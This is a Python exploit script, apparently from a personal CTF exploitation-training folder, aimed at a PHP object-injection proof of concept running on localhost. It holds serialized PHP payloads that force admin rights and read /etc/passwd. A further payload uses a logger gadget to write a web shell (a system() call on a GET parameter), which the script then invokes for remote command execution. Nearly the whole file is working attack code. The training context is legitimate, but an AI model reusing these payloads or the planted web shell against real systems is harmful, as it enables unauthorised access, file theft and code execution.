
# Start PHP server with: 
# $ cd /home/nikos/ctf/exploitation-training/network-exploitation/POCs/php-object-injection
# $ php -S 127.0.0.1:25565
#
# Generate payloads with:
# $ php payload-generator.php
#
# These payloads are then pasted as strings in the apporopriate variables in this python file
# Then run this exploit with:
# python exploit.py

import requests

payload__isAdmin = 'O:4:"User":2:{s:8:"username";s:5:"nikos";s:7:"isAdmin";b:1;}'
payload__dumpFile = 'O:4:"User":2:{s:8:"username";O:8:"ReadFile":1:{s:8:"filename";s:11:"/etc/passwd";}s:7:"isAdmin";b:1;}'
payload__writeFile = 'O:4:"User":2:{s:8:"username";a:1:{i:0;O:6:"Logger":2:{s:8:"filename";s:98:"/home/nikos/ctf/exploitation-training/network-exploitation/POCs/php-object-injection/malicious.php";s:3:"msg";s:56:"<?php if($_GET["cmd"]) system($_GET["cmd"]); exit(0); ?>";}}s:7:"isAdmin";b:1;}'

print("Testing Force Admin Payload")
r = requests.post(
    'http://127.0.0.1:25565',
    {
        'obj' : payload__isAdmin
    }
)
print(r.text)
print("\n")

print("Testing Dump File Payload")
r = requests.post(
    'http://127.0.0.1:25565',
    {
        'obj' : payload__dumpFile
    }
)
print(r.text)
print("\n")

print("Testing Write File Payload & RCE")
r = requests.post(
    'http://127.0.0.1:25565',
    {
        'obj' : payload__writeFile
    }
)
print(r.text)

r = requests.get(
    'http://127.0.0.1:25565/malicious.php',
    {
        'cmd' : 'echo \'Hello Vain World!\''
    }
)
print(r.text)
print("\n")
